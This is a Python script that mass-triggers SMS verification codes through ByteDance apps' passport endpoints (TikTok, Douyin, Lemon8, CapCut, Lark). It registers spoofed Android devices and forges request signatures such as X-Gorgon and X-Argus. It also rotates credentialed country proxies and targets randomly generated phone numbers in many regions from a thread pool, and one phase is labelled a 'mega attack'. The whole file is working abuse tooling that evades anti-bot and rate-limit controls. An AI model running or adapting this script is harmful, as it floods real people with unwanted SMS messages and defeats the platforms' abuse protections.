"""
Mega test script:
1. Test api.amemv.com + api3/api5 amemv domains with tc=3532/3635 on ALL apps
2. Use France proxy region 
3. Try multiple regions (FR, DE, AU, SG, JP, GB)
4. Test multiple device profile variations
5. Focus on AID=2658
6. Test BytePlus/Lark/other platforms
"""
import requests, random, time, json, hashlib, uuid, urllib3, sys
from urllib.parse import urlencode
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

urllib3.disable_warnings()
from SignerPy import sign as sp_sign, xor

# Proxy with configurable region
PROXY_TEMPLATE = 'http://user-2pbGchwGYvoGSTLv-type-datacenter-country-{region}:j8BogunPuMmSaOEU@geo.g-w.info:10080'
REGIONS = ["FR", "DE", "AU", "SG", "JP", "GB", "NL", "CA"]

# Amemv domains (user says these work)
AMEMV_DOMAINS = [
    "api.amemv.com",
    "api3-normal-c-lf.amemv.com",
    "api5-normal-c-lf.amemv.com",
    "api3.amemv.com",
    "api5.amemv.com",
    "api6.amemv.com",
]

# Extended tiktokv + musical.ly + new domains
TIKTOKV_DOMAINS = [
    "api16-normal-c-alisg.tiktokv.com", "api-t2.tiktokv.com", "api-va.tiktokv.com",
    "api16-normal-c-useast2a.tiktokv.com", "api16-normal-c-useast1a.tiktokv.com",
    "api16-normal-useast5.us.tiktokv.com", "api16-normal-v4.tiktokv.com",
    "api16-normal-v6.tiktokv.com", "api16.tiktokv.com",
    "api19-normal-c-alisg.tiktokv.com", "api19-normal-c-useast1a.tiktokv.com",
    "api19-normal-c-useast2a.tiktokv.com", "api19-normal-useast5.us.tiktokv.com",
    "api19.tiktokv.com", "api21-normal-c-alisg.tiktokv.com", "api21-normal-c-useast2a.tiktokv.com",
    "api22-normal-c-useast2a.tiktokv.com", "api22-normal-c-alisg.tiktokv.com",
    "api-h2.tiktokv.com", "api2-16-h2.musical.ly", "api2-19-h2.musical.ly",
    "api.lemon8-app.com",
]

# Web domains
WEB_DOMAINS = ["www.tiktok.com", "us.tiktok.com", "www.capcut.com"]

# BytePlus/Lark/other ByteDance domains to test
BYTEPLUS_DOMAINS = [
    "api.byteplus.com",
    "api-sg.byteplus.com",
    "api16.byteplus.com",
    "api.larksuite.com",
    "open.larksuite.com",
    "api.feishu.cn",
]

ALL_APPS = [
    {"aid": 2658, "app_name": "musical_ly", "name": "BD 2658 (Lemon8)", "signed": True, "priority": True},
    {"aid": 1233, "app_name": "musical_ly", "name": "TikTok Global", "signed": True},
    {"aid": 1340, "app_name": "trill", "name": "TikTok Lite", "signed": True},
    {"aid": 3006, "app_name": "vicut", "name": "CapCut", "signed": True},
    {"aid": 1180, "app_name": "musical_ly", "name": "Helo", "signed": True},
    {"aid": 7743, "app_name": "musical_ly", "name": "BD 7743", "signed": True},
    {"aid": 1128, "app_name": "aweme", "name": "Douyin", "signed": True},
    {"aid": 1319, "app_name": "super", "name": "Pipix", "signed": True},
    {"aid": 13, "app_name": "news_article", "name": "Toutiao", "signed": True},
    {"aid": 32, "app_name": "video_article", "name": "Xigua", "signed": True},
    {"aid": 2329, "app_name": "aweme_lite", "name": "Douyin Lite", "signed": True},
    {"aid": 1112, "app_name": "live_stream", "name": "Douyin Huoshan", "signed": True},
    {"aid": 1988, "app_name": "douyin_web", "name": "Douyin Web", "signed": False},
    {"aid": 1459, "app_name": "tiktok_web", "name": "TikTok Web", "signed": False},
    {"aid": 1583, "app_name": "tiktok_web", "name": "TikTok Ads", "signed": False},
    # BytePlus/Lark AIDs to try
    {"aid": 1357, "app_name": "lark", "name": "Lark", "signed": True},
    {"aid": 1161, "app_name": "lark", "name": "Lark CN (Feishu)", "signed": True},
    {"aid": 4370, "app_name": "musical_ly", "name": "Lemon8 Official", "signed": True},
    {"aid": 8311, "app_name": "tiktok_web", "name": "BD 8311", "signed": False},
    {"aid": 4068, "app_name": "tiktok_web", "name": "BD 4068", "signed": False},
]

FOCUS_TYPE_CODES = [3532, 3635]
ALL_TYPE_CODES = [3532, 3635, 3637, 3634, 3631, 3733, 3734, 3132, 3536, 3731, 3730, 34, 3530]

DEVICE_PROFILES = [
    {"brand": "Samsung", "model": "SM-G991B", "av": "13", "api": "33", "build": "TQ3A.230901.001"},
    {"brand": "Samsung", "model": "SM-S908B", "av": "14", "api": "34", "build": "UP1A.231005.007"},
    {"brand": "Google", "model": "Pixel 7", "av": "14", "api": "34", "build": "UP1A.231005.007"},
    {"brand": "Xiaomi", "model": "M2102K1G", "av": "12", "api": "31", "build": "SP1A.210812.016"},
    {"brand": "OnePlus", "model": "NE2215", "av": "13", "api": "33", "build": "TQ3A.230901.001"},
    {"brand": "HUAWEI", "model": "ELS-NX9", "av": "12", "api": "31", "build": "HUAWEILES-N39"},
]

# Phone number pools per region
PHONE_POOLS = {
    "FR": ["+336", "+337"],
    "DE": ["+4915", "+4917"],
    "AU": ["+614"],
    "SG": ["+658", "+659"],
    "JP": ["+8190", "+8180"],
    "GB": ["+4477"],
    "NL": ["+316"],
    "CA": ["+1647", "+1416"],
    "PK": ["+9230", "+9231", "+9232", "+9233"],
    "US": ["+1202", "+1305"],
}

lock = threading.Lock()
results = {"success": [], "rate_limited": [], "ec16": [], "other_errors": [], "tested": 0}

def get_phone(region):
    prefixes = PHONE_POOLS.get(region, ["+44770"])
    prefix = random.choice(prefixes)
    return prefix + str(random.randint(1000000, 9999999))

def get_proxy(region):
    return PROXY_TEMPLATE.format(region=region)

def register_device(aid, app_name, proxy, domain):
    dp = random.choice(DEVICE_PROFILES)
    openudid = ''.join(random.choices('0123456789abcdef', k=16))
    cdid = str(uuid.uuid4())
    ts = int(time.time())
    params = {"aid": str(aid), "app_name": app_name, "version_code": "350804", "version_name": "35.8.4",
              "device_platform": "android", "os": "android", "os_api": dp["api"], "os_version": dp["av"],
              "device_type": dp["model"], "device_brand": dp["brand"], "language": "en", "ac": "wifi",
              "channel": "googleplay", "resolution": "1080*2400", "dpi": "420",
              "openudid": openudid, "cdid": cdid, "ts": str(ts), "_rticket": str(ts*1000)}
    body = json.dumps({"magic_tag": "ss_app_log", "header": {
        "display_name": f"App_{aid}", "update_version_code": 350804, "manifest_version_code": 350804,
        "aid": aid, "channel": "googleplay", "package": "com.zhiliaoapp.musically",
        "app_version": "35.8.4", "version_code": 350804, "sdk_version": "2.14.0-rc.8",
        "os": "Android", "os_version": dp["av"], "os_api": int(dp["api"]),
        "device_model": dp["model"], "device_brand": dp["brand"], "device_manufacturer": dp["brand"],
        "cpu_abi": "arm64-v8a", "release_build": "f66b21c_20241009",
        "density_dpi": 420, "display_density": "xxhdpi", "resolution": "1080x2400", "language": "en",
        "timezone": 1, "access": "wifi", "cdid": cdid, "sig_hash": "aea615ab",
        "openudid": openudid, "clientudid": str(uuid.uuid4()), "region": "FR"}, "_gen_ts": ts})
    url = f"https://{domain}/service/2/device_register/?{urlencode(params)}"
    ua = f"com.zhiliaoapp.musically/350804 (Linux; U; Android {dp['av']}; en_US; {dp['model']}; Build/{dp['build']})"
    s = requests.Session(); s.proxies = {"http": proxy, "https": proxy}
    try:
        r = s.post(url, data=body, headers={"Host": domain, "User-Agent": ua,
                   "Content-Type": "application/json"}, verify=False, timeout=12)
        if r.status_code == 200:
            d = r.json()
            if "device_id" in d and d["device_id"]:
                return {"device_id": str(d["device_id"]), "iid": str(d["install_id"]),
                        "dp": dp, "openudid": openudid, "cdid": cdid, "ua": ua,
                        "odin_tt": ''.join(random.choices('0123456789abcdef', k=160)),
                        "csrf": ''.join(random.choices('0123456789abcdef', k=32))}
    except: pass
    finally: s.close()
    return None

def send_signed(domain, app, phone, tc, proxy, dev):
    encrypted = xor(phone)
    ts = int(time.time())
    rticket = str(ts * 1000 + random.randint(1000, 9999))
    common = {"passport-sdk-version": "50559", "iid": dev["iid"], "device_id": dev["device_id"],
              "ac": "wifi", "channel": "googleplay", "aid": str(app["aid"]),
              "app_name": app["app_name"], "version_code": "350804", "version_name": "35.8.4",
              "device_platform": "android", "os": "android", "ssmix": "a",
              "device_type": dev["dp"]["model"], "device_brand": dev["dp"]["brand"], "language": "en",
              "os_api": dev["dp"]["api"], "os_version": dev["dp"]["av"],
              "manifest_version_code": "350804", "resolution": "1080*2400", "dpi": "420",
              "update_version_code": "350804", "cdid": dev["cdid"], "carrier_region": "FR"}
    url_p = dict(common); url_p["_rticket"] = rticket; url_p["ts"] = str(ts)
    body_p = dict(common)
    body_p.update({"auto_read": "0", "account_sdk_source": "app", "unbind_exist": "35",
                   "mix_mode": "1", "mobile": encrypted, "type": str(tc),
                   "_rticket": rticket, "ts": str(ts)})
    url_str = urlencode(url_p); body = urlencode(body_p)
    cookies = f"odin_tt={dev['odin_tt']}; install_id={dev['iid']}; passport_csrf_token_default={dev['csrf']}"
    try:
        sigs = sp_sign(params=url_str, payload=body, cookie=cookies, version=8404, aid=app["aid"])
    except: return None
    headers = {"Host": domain, "Cookie": cookies, "X-SS-REQ-TICKET": rticket,
               "sdk-version": "2", "passport-sdk-version": "50559",
               "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
               "X-SS-DP": str(app["aid"]), "User-Agent": dev["ua"],
               "X-Gorgon": sigs.get("x-gorgon",""), "X-Khronos": sigs.get("x-khronos",str(ts)),
               "X-Argus": sigs.get("x-argus",""), "X-Ladon": sigs.get("x-ladon",""),
               "X-SS-STUB": sigs.get("x-ss-stub", hashlib.md5(body.encode()).hexdigest().upper())}
    url = f"https://{domain}/passport/mobile/send_code/v1/?{url_str}"
    s = requests.Session(); s.proxies = {"http": proxy, "https": proxy}
    try:
        r = s.post(url, data=body, headers=headers, verify=False, timeout=15)
        d = r.json()
        return {"status": r.status_code, "msg": d.get("message",""),
                "ec": d.get("data",{}).get("error_code") if isinstance(d.get("data"),dict) else None,
                "desc": (d.get("data",{}).get("description","") or "")[:80] if isinstance(d.get("data"),dict) else ""}
    except Exception as e: return {"status": -1, "msg": "error", "ec": -1, "desc": str(e)[:60]}
    finally: s.close()

def send_web(domain, app, phone, tc, proxy):
    encrypted = ''.join(format(ord(c) ^ 5, '02x') for c in phone)
    body = urlencode({"mobile": encrypted, "type": str(tc), "aid": str(app["aid"]),
                      "app_name": app["app_name"], "account_sdk_source": "web",
                      "mix_mode": "1", "auto_read": "0"})
    url = f"https://{domain}/passport/web/send_code/?aid={app['aid']}&app_name={app['app_name']}"
    headers = {"Host": domain, "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/125.0 Safari/537.36",
               "Content-Type": "application/x-www-form-urlencoded", "Accept": "application/json",
               "Origin": f"https://{domain}", "Referer": f"https://{domain}/", "X-SS-DP": str(app["aid"])}
    s = requests.Session(); s.proxies = {"http": proxy, "https": proxy}
    try:
        r = s.post(url, data=body, headers=headers, verify=False, timeout=15)
        d = r.json()
        return {"status": r.status_code, "msg": d.get("message",""),
                "ec": d.get("data",{}).get("error_code") if isinstance(d.get("data"),dict) else None,
                "desc": (d.get("data",{}).get("description","") or "")[:80] if isinstance(d.get("data"),dict) else ""}
    except Exception as e: return {"status": -1, "msg": "error", "ec": -1, "desc": str(e)[:60]}
    finally: s.close()

def run_test(domain, app, tc, region, reg_domain=None):
    proxy = get_proxy(region)
    phone = get_phone(region)
    r = None
    
    if app["signed"]:
        rd = reg_domain or domain
        # Try registering on current domain first, fallback to amemv
        dev = register_device(app["aid"], app["app_name"], proxy, rd)
        if not dev and rd != "api3-normal-c-lf.amemv.com":
            dev = register_device(app["aid"], app["app_name"], proxy, "api3-normal-c-lf.amemv.com")
        if dev:
            r = send_signed(domain, app, phone, tc, proxy, dev)
    else:
        r = send_web(domain, app, phone, tc, proxy)
    
    with lock:
        results["tested"] += 1
        if r:
            entry = {"domain": domain, "app": app["name"], "aid": app["aid"], "tc": tc, 
                     "region": region, "phone": phone, "msg": r["msg"], "ec": r["ec"]}
            if r["msg"] == "success":
                results["success"].append(entry)
                print(f"\n  *** SUCCESS *** {app['name']:20} AID={app['aid']} domain={domain} tc={tc} region={region} phone={phone}")
            elif r["ec"] == 7:
                results["rate_limited"].append(entry)
                if results["tested"] % 20 == 0:
                    print(f"\r  RL: {app['name']:15} AID={app['aid']} domain={domain[:30]:30} tc={tc} reg={region}", end="", flush=True)
            elif r["ec"] == 16:
                results["ec16"].append(entry)
            else:
                results["other_errors"].append(entry)
                print(f"\n  ?? {app['name']:20} AID={app['aid']} ec={r['ec']} msg={r['msg']!r} desc={r['desc']!r} domain={domain} region={region}")
        if results["tested"] % 50 == 0:
            s = len(results["success"]); rl = len(results["rate_limited"])
            print(f"\r  [{results['tested']} done] S:{s} RL:{rl} ec16:{len(results['ec16'])} err:{len(results['other_errors'])}     ", end="", flush=True)

def main():
    tasks = []
    
    # ===== PHASE 1: api.amemv.com + tc 3532/3635 on ALL apps (FR proxy) =====
    print("=== PHASE 1: amemv domains + tc 3532/3635 on ALL apps (FR proxy) ===")
    for app in ALL_APPS:
        for domain in AMEMV_DOMAINS:
            for tc in FOCUS_TYPE_CODES:
                tasks.append((domain, app, tc, "FR", domain))
    
    # ===== PHASE 2: AID=2658 on ALL domains × ALL regions × ALL type codes =====
    print("=== PHASE 2: AID=2658 mega attack - all domains × all regions ===")
    app_2658 = ALL_APPS[0]
    for region in REGIONS:
        for domain in AMEMV_DOMAINS + TIKTOKV_DOMAINS[:8]:
            for tc in FOCUS_TYPE_CODES + [3637, 3634, 3733]:
                tasks.append((domain, app_2658, tc, region, None))
    
    # ===== PHASE 3: All success apps × multiple regions × amemv + tiktokv =====
    print("=== PHASE 3: All apps × multiple regions ===")
    for region in ["FR", "DE", "AU", "SG"]:
        for app in ALL_APPS[:12]:  # Main apps
            for tc in FOCUS_TYPE_CODES:
                domain = random.choice(AMEMV_DOMAINS + TIKTOKV_DOMAINS[:8])
                tasks.append((domain, app, tc, region, None))
    
    # ===== PHASE 4: Web apps on web domains with different regions =====
    print("=== PHASE 4: Web apps × web domains × regions ===")
    for region in REGIONS[:4]:
        for app in [a for a in ALL_APPS if not a["signed"]]:
            for domain in WEB_DOMAINS:
                for tc in FOCUS_TYPE_CODES:
                    tasks.append((domain, app, tc, region, None))
    
    # ===== PHASE 5: BytePlus/Lark domains =====
    print("=== PHASE 5: BytePlus/Lark domains ===")
    for domain in BYTEPLUS_DOMAINS:
        for app in ALL_APPS[:6]:
            for tc in FOCUS_TYPE_CODES:
                tasks.append((domain, app, tc, "FR", domain))
    
    random.shuffle(tasks)
    
    print(f"\nTotal tasks: {len(tasks)}")
    print(f"Apps: {len(ALL_APPS)} | Regions: {len(REGIONS)} | amemv domains: {len(AMEMV_DOMAINS)}")
    print("="*70)
    
    start = time.time()
    with ThreadPoolExecutor(max_workers=10) as ex:
        futures = [ex.submit(run_test, d, a, t, reg, rd) for d, a, t, reg, rd in tasks]
        try:
            for f in as_completed(futures): f.result()
        except KeyboardInterrupt: print("\nInterrupted!")
    
    elapsed = time.time() - start
    print(f"\n\n{'='*70}")
    print(f"COMPLETE: {results['tested']} tests in {elapsed:.0f}s ({results['tested']/max(elapsed,1):.1f} req/s)")
    print(f"\n*** SUCCESSES ({len(results['success'])}) ***")
    for s in results["success"]: print(f"  {s}")
    print(f"\n** RATE LIMITED ({len(results['rate_limited'])}) — signature valid, IP throttled **")
    # Group by app
    rl_apps = {}
    for r in results["rate_limited"]:
        k = f"{r['app']} (AID={r['aid']})"
        if k not in rl_apps: rl_apps[k] = {"domains": set(), "regions": set(), "tcs": set()}
        rl_apps[k]["domains"].add(r["domain"]); rl_apps[k]["regions"].add(r["region"]); rl_apps[k]["tcs"].add(r["tc"])
    for app, info in rl_apps.items():
        print(f"  {app}: {len(info['domains'])} domains, regions={info['regions']}, tcs={info['tcs']}")
    print(f"\n** ec=16 no permissions ({len(results['ec16'])}) **")
    ec16_apps = set(f"{r['app']} (AID={r['aid']})" for r in results["ec16"])
    for a in ec16_apps: print(f"  {a}")
    print(f"\n** Other errors ({len(results['other_errors'])}) **")
    for e in results["other_errors"][:20]: print(f"  {e}")
    
    with open("/home/ubuntu/mega_test_results.json", "w") as f:
        json.dump(results, f, indent=2, default=str)
    print(f"\nSaved to /home/ubuntu/mega_test_results.json")

if __name__ == "__main__":
    main()
